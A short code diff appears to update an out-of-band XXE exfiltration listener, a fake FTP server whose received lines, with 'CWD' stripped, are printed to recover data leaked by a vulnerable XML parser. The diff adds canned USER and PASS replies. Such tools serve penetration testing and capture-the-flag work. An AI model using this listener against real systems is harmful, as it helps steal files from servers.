@@ -31,8 +31,9 @@ HOST = ''
 PORT = args.port
 
 welcome = b'220 oob-xxe\n'
-get = b'230 more data please!\n'
-
+ftp_catch_all_response = b'230 more data please!\n'
+ftp_user_response = b'331 hello world!\n'
+ftp_pass_response = b'230 my password is also hunter2!\n'
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -53,7 +54,12 @@ def main():
 
     while True:
         data = conn.recv(1024)
-        conn.sendall(get)
+        ftp_command = data.split(" ", 1)
+        response = {
+            'user': ftp_user_response,
+            'pass': ftp_pass_response,
+        }.get(ftp_command[0].lower(), ftp_catch_all_response)
+        conn.sendall(response)
         line = data.decode('UTF-8')
         line = line.replace("\n","").replace("CWD","")
         print(line)
